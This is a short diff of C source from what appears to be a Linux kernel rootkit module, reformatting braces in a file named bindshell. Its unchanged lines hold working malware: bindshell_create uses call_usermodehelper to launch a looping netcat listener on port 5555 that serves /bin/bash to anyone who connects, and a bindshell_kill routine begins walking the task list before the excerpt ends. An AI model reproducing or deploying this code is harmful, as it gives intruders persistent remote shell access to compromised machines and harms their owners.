@@ -1,12 +1,14 @@
 #include "bindshell.h"
 
-void bindshell_create(char *commands) {
+void bindshell_create(char *commands)
+{
     char *argv[] = {"/bin/bash","-c","while :; do /bin/nc -vlp 5555 -e /bin/bash;done", NULL};
     char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
-void bindshell_kill(void) {
+void bindshell_kill(void)
+{
     struct task_struct *task;
     struct task_struct *my_bash;
 
